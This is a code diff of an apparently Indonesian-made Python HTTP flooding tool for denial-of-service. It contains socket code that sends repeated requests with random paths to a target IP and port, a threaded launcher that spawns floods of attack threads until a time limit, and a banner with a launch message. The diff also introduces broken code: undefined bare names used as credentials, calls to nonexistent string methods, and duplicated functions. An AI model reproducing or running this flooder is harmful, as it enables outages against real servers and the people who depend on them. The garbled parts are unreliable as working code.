@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 # CHECK IMPORT
 try:
     import socket
@@ -8,18 +9,15 @@ try:
     import os
     import platform
     import sys
-    import requests
     from colorama import Fore
 except ModuleNotFoundError as e:
-    print(f"{e} CAN'T IMPORT . . . . ")
+    print(f"{e} CAN'T IMPORT . . . .")
     exit()
-
-GUI_SETUP = 0
 
 # DEF & CLASS
 
-username = ''
-password = ''
+username = fuck
+password = zeon
 
 def login_checker(username,password):
     file_path = os.path.join(os.path.dirname(__file__), 'login.txt')
@@ -28,10 +26,29 @@ def login_checker(username,password):
             credentials = [x.strip() for x in f.readlines() if x.strip()]
             for x in credentials:
              c_username, c_password = x.split('@')
-             if c_username.kls()  == username.kls() and c_password.kls() == password.kls():
+             if c_username.fuck()  == username.zeon() and c_password.fuck() == password.zeon():
                return True
     except FileNotFoundError:
         return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'
+
+def clear_text():
+    if platform.system().upper() == "WINDOWS":
+        os.system('cls')
+    else:
+        os.system('clear')
+
+def status_print(ip,port,thread_id,rps,path_get):
+    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+def generate_url_path_pyflooder(num):
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, int(num)))
+    return data
+    
+def generate_url_path_choice(num):
+    data = ""
+    for _ in range(int(num)):
+        data += random.choice(letter)
+    return data
 
 def clear_text():
     if platform.system().upper() == "WINDOWS":
@@ -50,9 +67,10 @@ def generate_url_path_choice(num):
     for _ in range(int(num)):
         data += random.choice(letter)
     return data
-
+    
 # DOS
-def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
+def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
+    rps = 0
     url_path = ''
     path_get = ['PY_FLOOD','CHOICES_FLOOD']
     path_get_loader = random.choice((path_get))
@@ -62,73 +80,50 @@ def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
         url_path = generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     try:
-        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
-        elif data_type_loader_packet == 'OWN1':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
-        elif data_type_loader_packet == 'OWN2':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
-        elif data_type_loader_packet == 'OWN3':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN4':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
-        elif data_type_loader_packet == 'OWN5':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
-        elif data_type_loader_packet == 'OWN6':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN7':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
-        elif data_type_loader_packet == 'OWN8':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
-        elif data_type_loader_packet == 'TEST':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
-        elif data_type_loader_packet == 'TEST2':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
-        elif data_type_loader_packet == 'TEST3':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
-        elif data_type_loader_packet == 'TEST4':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
-        elif data_type_loader_packet == 'TEST5':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
+        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
             s.sendall(packet_data)
             s.send(packet_data)
+            rps += 2
     except:
         try:
             s.shutdown(socket.SHUT_RDWR)
             s.close()
         except:
             pass
+    status_print(ip,port,id,rps,path_get_loader)
 
 status_code = False
-def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
-    global status_code
+id_loader = 0
+def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
+    global status_code,id_loader
     if status_code == True:
         while time.time() < time_loader:
             for _ in range(spam_loader):
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
+                id_loader += 1
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                 th.start()
     else:
         threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
 
 #DATA
 banner = f"""
-{Fore.BLUE}███████▒▒  ██▒▒      ██▒▒  ████████▒▒ ██▒▒        ████▒▒     
-{Fore.BLUE}██▒▒   ██▒▒ ██▒▒    ██▒▒   ██▒▒       ██▒▒      ██▒ ██▒▒  
-{Fore.BLUE}██▒▒   ██▒▒  ██▒▒  ██▒▒    ██▒▒       ██▒▒     ██▒▒   ██▒▒
-{Fore.BLUE}██▒▒   ██▒▒   ██▒▒██▒▒     ██▒▒       ██▒▒     ██▒▒   ██▒▒
-{Fore.CYAN}███████▒▒       ██▒▒       ██████▒▒   ██▒▒     ██▒▒   ██▒▒
-{Fore.CYAN}██▒▒            ██▒▒       ██▒▒       ██▒▒      ██▒   ██▒▒  
-{Fore.CYAN}██▒▒            ██▒▒       ██▒▒       ████████▒▒ ████▒▒     
+{Fore.BLUE}████████▒▒██▒▒         ███▒▒   
+{Fore.BLUE}██▒▒       ██▒▒       ██▒  ██▒▒  
+{Fore.BLUE}██▒▒       ██▒▒     ██▒▒    ██▒▒
+{Fore.BLUE}██▒▒       ██▒▒     ██▒▒    ██▒▒  
+{Fore.CYAN}██████▒▒  ██▒▒     ██▒▒    ██▒▒
+{Fore.CYAN}██▒▒       ██▒▒       ██▒ ██▒▒  
+{Fore.CYAN}██▒▒       ████████▒▒  ███▒▒    
 {Fore.CYAN} ▒▒▒              ▒▒▒        ▒▒▒        ▒▒ ▒▒ ▒▒   ▒▒ ▒▒      ▒ ▒▒     ▒▒▒▒▒
 {Fore.CYAN}  ▒                ▒▒         ▒▒          ▒ ▒ ▒      ▒ ▒        ▒▒        ▒▒
 {Fore.RED}===============================================================================
@@ -165,4 +160,3 @@ clear_text()
 print(banner)
 status_code = True
 print(f"{Fore.GREEN}TRYING SENT . . . . PAKETMU AKAN DIKIRIM OLEH KURIR ZAN...!!💯🔥🔥⚡{Fore.RESET}")
-                                                    
